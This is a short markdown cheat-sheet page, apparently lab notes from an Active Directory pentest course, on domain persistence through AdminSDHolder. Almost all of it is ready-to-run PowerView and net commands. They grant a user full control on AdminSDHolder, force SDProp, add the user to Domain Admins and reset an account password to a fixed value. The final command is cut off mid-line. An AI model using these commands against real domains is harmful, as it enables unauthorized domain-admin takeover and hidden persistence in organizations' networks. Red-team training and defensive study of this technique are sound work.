---
description: Domain persistence using AdminC
---

# 1⃣ AdminSDHolder

### **Check if the student has replication rights**

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

### **Add full control permissions for a user to the adminSDHolder**

```
Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
```

### **Run SDProp on AD (Force the sync of AdminSDHolder)**

```
Invoke-SDPropagator -showProgress -timeoutMinutes 1

#Before server 2008
Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```



### **Check if user got generic all against domain admins group**

```
Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
```



### **Add user to domain admin group**

```
Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
```

or

```
Net group "domain admins" sportless /add /domain
```

### **Abuse Reset Password using powerview\_dev**

```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -As
```
